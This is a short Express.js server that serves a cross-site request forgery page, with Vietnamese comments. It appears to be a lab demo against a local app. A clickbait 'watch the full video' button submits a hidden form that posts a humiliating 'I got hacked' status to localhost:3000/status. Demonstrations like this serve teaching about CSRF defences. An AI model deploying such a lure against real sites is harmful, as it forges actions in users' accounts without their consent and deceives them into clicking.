const express = require("express");
const cookieParser = require("cookie-parser");
const bodyParser = require("body-parser");

const PORT = 3300;
const app = express();
app.use(cookieParser());
app.use(bodyParser.urlencoded({ extended: false }));

// Trang chứa nội dung dụ dỗ người dùng click
app.get("/", (req, res) => {
  res.send(`
  <html><body>
  <form action='http://localhost:3000/status' method='post'>
    <input type="text" name="content" value='Tôi hồ đồ quá, tôi đã bị hack' style="display: none" />
    <button type="submit">Click vào đây để xem full video</button>
  </form>
  </body></html>
  `);
});

app.listen(PORT, () => {
  console.log(`Hacker Server is running on http://127.0.0.1:${PORT}`);
});
